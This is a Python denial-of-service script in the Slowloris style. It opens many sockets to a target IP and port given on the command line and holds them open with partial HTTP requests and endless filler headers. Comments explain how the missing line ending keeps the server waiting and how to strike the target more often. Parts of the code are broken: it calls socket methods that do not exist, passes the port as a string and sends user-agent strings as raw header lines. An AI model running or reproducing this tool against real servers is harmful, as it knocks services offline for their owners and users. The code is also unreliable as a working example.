#There we go
import socket
import random
import time
import sys
def Main():
	try:
			global allthesockets
			headers = [
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 	Edge/14.14393"
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
					"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
					"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
					"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
					"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
					"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
					"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]
			howmany_sockets = sys.argv[3]
			ip = sys.argv[1]
			port = sys.argv[2]
			allthesockets = []
			print("Creating sockets...")
			for k in range(int(howmany_sockets)):
					try:
							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							s.settimeout(4)
							s.connect((ip, port))
							allthesockets.append(s)
					except Exception as e:
							print(e)
			print(range(int(howmany_sockets))," sockets are ready.")
			num = 0
			for r in allthesockets:
					print("[",num,"]")
					num += 1 
					r.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
					ua = headers[0]
					ua = random.choice(headers)
					s.send_header("User-Agent", ua)
					s.send_header("Accept-language", "en-US,en,q=0.5")
					print("Successfully sent [+] GET /? HTTP /1.1 ...")
					for header in headers:
							r.send(bytes("{}\r\n".format(header).encode("utf-8")))
					print("Successfully sent [+] Headers ...")

			while True:
					for v in allthesockets:
							try:
									#THIS Is the place, X-a keeps the server sending data back,
									#if we used : X-a : {}\r\n\r\n - he would CLOSE the connection
									#because that is what he expects, the second \r\n makes the difference
									#so if we leave it out we keep the thing alive, sending a random number
									#to appear as we are sending data
									v.send("X-a: {}\r\n".format(random.randint(1,5000)).encode("utf-8"))
									print("[-][-][*] Waiter sent.")
							except:
									# PROBLEM  : Get an error saying : ( MAYBE ITS THE TIME SLEEP? ??)
									#ConnectionAbortedError: [WinError 10053] An established connection was aborted by the software in your host machine
									#solution : use VM
									print("[-] A socket failed, reattempting...")
									#list_of_sockets.remove(v)
									allthesockets.remove(v)
									try:
											v.socket.socket(socket.AF_INET, socket.SOCK_STREAM)
											v.settimeout(4)
											v.connect((ip,port))
											#for each socket:
											v.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0,2000)).encode("utf-8"))
											for header in headers:
													v.send(bytes("{}\r\n".format(header).encode("utf-8")))
									except:
											pass

					print("\n\n[*] Successfully sent [+] KEEP-ALIVE headers...\n")
					print("Sleeping off ...")
					time.sleep(1)
					#by default this was set to 10 (i think)
					#if we want to continously hit the target we can set it to 1 for example
					
			
			
	except ConnectionRefusedError:
			print("[-] Connection refused, retrying...")
			Main()
	

Main()
